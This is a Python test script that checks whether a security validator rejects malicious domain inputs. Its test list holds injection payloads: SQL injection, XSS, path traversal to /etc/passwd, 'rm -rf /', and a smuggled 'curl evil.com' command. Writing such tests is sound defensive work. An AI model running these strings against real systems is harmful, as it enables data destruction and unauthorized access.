"""
Test script for security validation functionality
"""

from security import security_validator

def test_security_validation():
    """Test various injection attempts to ensure they are blocked"""
    
    print("Testing Security Validation...")
    
    # Test valid inputs
    try:
        result = security_validator.validate_domain_input(
            "Machine Learning", "2020-2024", 5, 0.7
        )
        print("✅ Valid input accepted:", result['domain'])
    except ValueError as e:
        print("❌ Valid input rejected:", str(e))
    
    # Test SQL injection attempts
    malicious_inputs = [
        "'; DROP TABLE users; --",
        "Machine Learning' OR 1=1 --",
        "ML UNION SELECT * FROM secrets",
        "exec('rm -rf /')",
        "<script>alert('xss')</script>",
        "javascript:alert('hack')",
        "__import__('os').system('ls')",
        "eval('malicious code')",
        "system('cat /etc/passwd')",
        "ML && curl evil.com",
        "../../../etc/passwd",
        "python -c 'import os; os.system(\"whoami\")'",
    ]
    
    print("\nTesting malicious inputs:")
    for i, malicious_input in enumerate(malicious_inputs, 1):
        try:
            security_validator.validate_domain_input(
                malicious_input, "2020-2024", 5, 0.7
            )
            print(f"❌ Test {i}: Malicious input was NOT blocked: {malicious_input[:30]}...")
        except ValueError as e:
            print(f"✅ Test {i}: Malicious input blocked successfully")
    
    # Test edge cases
    edge_cases = [
        ("", "Empty domain"),
        ("A" * 200, "Too long domain"),
        ("Valid Domain", "1500-2030", 5, 0.7, "Invalid year range"),
        ("Valid Domain", "2020-2024", 100, 0.7, "Too many papers"),
        ("Valid Domain", "2020-2024", 5, 5.0, "Invalid temperature"),
    ]
    
    print("\nTesting edge cases:")
    for i, case in enumerate(edge_cases, 1):
        try:
            if len(case) == 5:
                domain, years, count, temp, description = case
                security_validator.validate_domain_input(domain, years, count, temp)
                print(f"❌ Test {i}: {description} was NOT caught")
            else:
                domain, description = case
                security_validator.validate_domain_input(domain, "2020-2024", 5, 0.7)
                print(f"❌ Test {i}: {description} was NOT caught")
        except ValueError as e:
            print(f"✅ Test {i}: {case[-1] if len(case) > 2 else case[1]} caught successfully")
    
    print("\n✅ Security validation tests completed!")

if __name__ == "__main__":
    test_security_validation()
